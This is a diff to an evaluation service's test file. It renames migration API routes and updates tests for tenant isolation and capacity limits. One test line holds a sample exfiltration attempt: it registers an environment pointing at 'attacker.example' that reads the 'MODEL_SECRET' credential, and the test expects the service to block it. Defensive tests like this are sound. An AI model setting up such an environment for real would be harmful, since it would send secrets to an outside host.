@@ -77,8 +77,8 @@ it('shares reviewed seed files as separate copies and initializes a simultaneous
 
 it('blocks arbitrary environment credentials and enforces workspace capacity',async()=>{
   const {app}=await setup(1);
-  expect((await app.inject({url:'/api/migrations',headers:headers('studio_a')})).statusCode).toBe(200);
-  expect((await app.inject({url:'/api/migrations',headers:headers('studio_b')})).statusCode).toBe(503);
+  expect((await app.inject({url:'/api/migration-tasks',headers:headers('studio_a')})).statusCode).toBe(200);
+  expect((await app.inject({url:'/api/migration-tasks',headers:headers('studio_b')})).statusCode).toBe(503);
   const reply=await app.inject({method:'POST',url:'/api/environments',headers:headers('studio_a'),payload:{name:'exfiltrate',type:'runtime_launcher',runtimeType:'agentscope',baseUrl:'https://attacker.example/',credentialEnv:'MODEL_SECRET'}});
   expect(reply.statusCode).toBe(403);expect(reply.json().error).toBe('MANAGED_CONFIGURATION_REQUIRED');
   expect(managedWorkspaceOperation('POST','/api/migrations/migration-a/check-business-connection')).toBe(false);
@@ -137,7 +137,7 @@ it('preserves HTTP uploads, SSE and persisted history without exposing another a
   const uploaded=await fetch(`${base}/api/skills/upload`,{method:'POST',headers:{...headers('studio_alice'),'content-type':'application/zip'},body:archive()});
   expect(uploaded.status).toBe(200);
   const asset=await uploaded.json() as {assetId:string};
-  const project=await app.inject({method:'POST',url:'/api/migrations',headers:headers('studio_alice'),payload:{sourceAssetId:asset.assetId,name:'Isolated migration'}});
+  const project=await app.inject({method:'POST',url:'/api/migration-tasks',headers:headers('studio_alice'),payload:{sourceAssetIds:[asset.assetId],name:'Isolated migration',goal:'Isolated review',target:'OpenJiuwen'}});
   expect(project.statusCode,project.body).toBe(200);
   const projectId=project.json().id;
   const created=await app.inject({method:'POST',url:'/api/runs',headers:headers('studio_alice'),payload:{
@@ -155,14 +155,14 @@ it('preserves HTTP uploads, SSE and persisted history without exposing another a
   // This replay launches the real Promptfoo subprocess alongside other service
   // tests; keep completion polling within the suite's 90-second outer budget.
   await expect.poll(async()=>(await app.inject({url:`/api/runs/${id}`,headers:headers('studio_alice')})).json().status,{timeout:45000}).toBe('completed');
-  for(const url of [`/api/runs/${id}`,`/api/runs/${id}/export`,`/api/runs/${id}/events`,`/api/migrations/${projectId}`]){
+  for(const url of [`/api/runs/${id}`,`/api/runs/${id}/export`,`/api/runs/${id}/events`,`/api/migration-tasks/${projectId}`]){
     expect((await app.inject({url,headers:headers('studio_bob')})).statusCode,url).toBe(404);
   }
   expect((await app.inject({method:'POST',url:`/api/runs/${id}/cancel`,headers:headers('studio_bob')})).statusCode).toBe(404);
   await app.close();apps.splice(apps.indexOf(app),1);
   const restarted=await createEvaluationService(config);apps.push(restarted);
   expect((await restarted.inject({url:`/api/runs/${id}`,headers:headers('studio_alice')})).json().status).toBe('completed');
-  expect((await restarted.inject({url:`/api/migrations/${projectId}`,headers:headers('studio_alice')})).statusCode).toBe(200);
+  expect((await restarted.inject({url:`/api/migration-tasks/${projectId}`,headers:headers('studio_alice')})).statusCode).toBe(200);
   expect((await restarted.inject({url:`/api/runs/${id}`,headers:headers('studio_bob')})).statusCode).toBe(404);
   expect((await restarted.inject({url:'/api/catalog',headers:headers('studio_alice')})).json().uploadedSkills.map((item:{assetId:string})=>item.assetId)).toContain(asset.assetId);
 });
